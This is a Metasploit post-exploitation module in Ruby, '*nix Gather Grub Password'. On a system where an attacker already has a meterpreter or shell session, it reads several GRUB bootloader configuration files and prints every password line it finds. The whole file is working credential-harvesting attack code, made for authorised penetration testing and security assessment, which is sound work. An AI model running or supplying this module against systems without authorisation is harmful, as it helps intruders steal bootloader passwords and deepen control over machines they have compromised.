##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name'         => '*nix Gather Grub Password',
      'Description'  => %q{
        This module gathers grub passwords from grub bootloader config file.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Garvit Dewan <d.garvit[at]gmail.com>' # @dgarvit
        ],
      'Platform'     => ['linux', 'osx', 'unix', 'solaris', 'bsd'],
      'SessionTypes' => ['meterpreter', 'shell'],
      'References'   => [
        ['URL', 'https://help.ubuntu.com/community/Grub2/Passwords#Password_Encryption']
      ]
    ))
  end

  def run
    targets = [
      '/boot/grub/grub.conf',
      '/boot/grub/grub.cfg',
      '/etc/grub.conf',
      '/etc/grub/grub.cfg',
      '/etc/grub.d/00_header',
      '/mnt/sysimage/boot/grub.conf',
      '/mnt/boot/grub/grub.conf',
      '/rpool/boot/grub/grub.cfg'
    ]

    targets.each do |target|
      if file? target
        print_status("Reading #{target}")
        file = read_file(target)
        lines = file.split("\n")
        found = false
        lines.each do |line|
          line = line.strip
          if line.start_with?("password")
            print_line(line)
            found = true
          end
        end

        if !found
          print_status("No password found in config file")
        end
      end
    end
  end
end
